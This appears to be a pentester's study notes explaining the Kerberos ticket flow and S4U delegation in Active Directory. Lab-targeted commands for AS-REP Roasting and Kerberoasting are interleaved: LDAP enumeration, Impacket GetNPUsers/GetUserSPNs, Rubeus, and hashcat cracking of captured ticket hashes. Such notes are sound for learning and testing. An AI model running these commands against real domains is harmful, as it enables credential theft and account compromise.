
first i have my username + password 
### 1. Ask For TGT 
1. i send a AS-REQ (Auth service) to the DC contains timestamp encrypted with my hash
2. DC response with AS-REP contains TGT + enc-part by my hash (contains session-key)
**now i have TGT+session-key**

#### AS-REP Roasting
#ASRoasting #ASREPRoast #DoNotPreAuth
the AS-REP contains the enc-part encrypted with the user hash, right? so when the user has `Do not require Kerberos preauthentication` enabled the KDC will send The AS-REP anyway whatever the AS-REQ is. so inside the AS-RES i can crack the enc-part. 

```bash
# enum
ldapsearch -x -H ldap://192.168.1.100 -D "hacker@forest.lab" -w "palestine" -b "DC=forest,DC=lab" "(userAccountControl:1.2.840.113556.1.4.803:=4194304)"

# bruteforce 
GetNPUsers forest.lab/ -usersfile users.txt -format hashcat -outputfile asrep_hashes.txt -dc-ip 10.10.161.14

# sinper
Rubeus.exe asreproast /user:userx /nowrap

# crack 
hashcat -m 18200 asrep_hashes.txt /usr/share/wordlists/rockyou.txt --force
```

---
### 2. Ask For TGS
1. Again i send TGS-REQ to the DC contains the timestamp encrypted with the session-key + TGT + SPN
2. DC response with TGS-REP contains the TGS ticket (encrypted with service hash) + enc-part (encrypted with session key)

>becuase the TGT encrypted with the `krbtgt`'s hash the DC can look into it. 

**now i have TGS+new-session-key**

---
### 3. Use the SPN 
i go to this services (SPN)

1. i send AP-REQ contains the TGS + timestamp (enctyped with the session-key) 
2. the service should also verfiy that it's the real service (if it can decrpy the TGS) so it use the new-session-key and send also the timestamp encrypted with the new-session-key 

>also becuase the TGS encrypted with the `serivce`'s hash the Service can look into it.

#### Kerberoasting 
#Kerberoasting
you said the the TGS ticket (not the enc-part) is encrypted with the target account's hash (usually a human user with weak password)? ok let's reverse it so i got the hash of this user (if this user is krbtgt or computer i will not try to crack his password). 

first let's get who has SPN (so has a TGS) but his password can be cracked (not service user).
```bash
ldapsearch -x -H ldap://192.168.1.100 -D 'hacker@forest.lab' -w 'palestine' -b "DC=forest,DC=lab" "(&(sAMAccountType=805306368)(servicePrincipalName=*))"

GetUserSPNs.py forest.lab/hacker:palestine -dc-ip 192.168.1.100 
```

ok let's get his TGS and crack it
```bash
GetUserSPNs.py forest.lab/hacker:palestine -dc-ip 192.168.1.100 -request -request-user srv_user -outputfile tgs_hashes.txt 

hashcat -a 0 -m 13100 tgs_hashes.txt wordlists
```



## S4U

### S4U2Self 

first i have my service account + its key

1. service sends **TGS-REQ (S4U2Self)** to the DC    
    - contains the **service ticket** (proving itself)        
    - asks for a ticket to itself (`SPN = service`) but with `client = userX`        
    
2. DC responds with **TGS-REP**    
    - contains a **service ticket** (client = userX, service = this service)
    - session-key (encrypted with service’s key)

now the service has a ticket that says:  
“this is userX talking to service” – but in reality it was requested by the service.

### S4U2Proxy 

first i already have S4U2Self ticket (userX → service)

1. service sends **TGS-REQ (S4U2Proxy)** to the DC 
    - contains its own service ticket
    - contains the **S4U2Self ticket** (userX → service)        
    - asks for a ticket for `SPN = target service` (ex: MSSQL/sqlserver)
    
2. DC responds with **TGS-REP**    
    - contains a **service ticket** (client = userX, service = target service)        
    - new-session-key (encrypted with target service’s key)            

now the first service can connect to the target service **as userX**.

>S4U2Proxy only works if the first service is allowed (constrained delegation) to talk to the target service.